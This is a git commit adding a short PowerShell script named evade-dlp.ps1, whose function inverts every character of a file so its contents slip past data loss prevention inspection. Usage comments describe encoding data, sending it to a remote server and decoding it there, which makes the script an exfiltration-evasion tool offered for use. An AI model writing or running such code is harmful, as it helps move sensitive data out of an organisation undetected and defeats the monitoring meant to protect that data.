38d711d3d5d5d6c0f36eacfd933584aa8029c74b
frkntrn <frkntrn@protonmail.com>
2019-05-07 00:27:09 +0300

    Create evade-dlp.ps1

---
+++ evade-dlp.ps1
@@ -0,0 +1,8 @@
+#a little function to evade dlp 
+
+function evade-dlp {$a=""; ([char[]](cat $args[0] -Encoding utf8) | %{$a += [char](65535-[int]$_)}); return $a}
+
+#Usage
+#evade-dlp data.txt > encoded.txt
+#send data to remote server
+#evade-dlp encoded.txt > data.txt
